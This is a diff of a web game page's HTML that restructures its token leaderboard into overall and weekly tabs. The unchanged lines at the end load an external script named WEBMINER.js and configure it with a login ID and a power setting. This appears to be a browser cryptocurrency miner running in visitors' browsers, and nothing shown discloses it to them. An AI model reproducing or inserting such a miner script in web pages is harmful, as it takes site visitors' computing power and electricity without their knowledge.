@@ -383,9 +383,9 @@
       <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
       <tbody id="leaderboard"></tbody>
     </table>
-  </div> -->
+  </div> --> 
 
-    <div id="leaderboardTabs">
+  <!--  <div id="leaderboardTabs">
   <button class="click-button" onclick="showTab('overall')" id="overallTabBtn">Overall</button>
   <button class="click-button" onclick="showTab('weekly')" id="weeklyTabBtn">Weekly Winners</button>
 </div>
@@ -402,7 +402,31 @@
     <thead><tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr></thead>
     <tbody id="weeklyLeaderboardBody"></tbody>
   </table>
+</div>-->
+
+<div id="leaderboardContainer">
+  <div class="tabs">
+    <button class="tab-button active" onclick="showTab('overall')" id="overallTabBtn">Overall</button>
+    <button class="tab-button" onclick="showTab('weekly')" id="weeklyTabBtn">Weekly Winners</button>
+  </div>
+  <div id="overallLeaderboard" class="leaderboard-tab">
+    <h2>Overall Leaderboard</h2>
+    <table>
+      <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
+      <tbody id="leaderboard"></tbody>
+    </table>
+  </div>
+  <div id="weeklyLeaderboard" class="leaderboard-tab" style="display: none;">
+    <h2>Weekly Winners</h2>
+    <table>
+      <thead><tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr></thead>
+      <tbody id="weeklyLeaderboardBody"></tbody>
+    </table>
+  </div>
 </div>
+
+
+    
 
   <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
   <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>
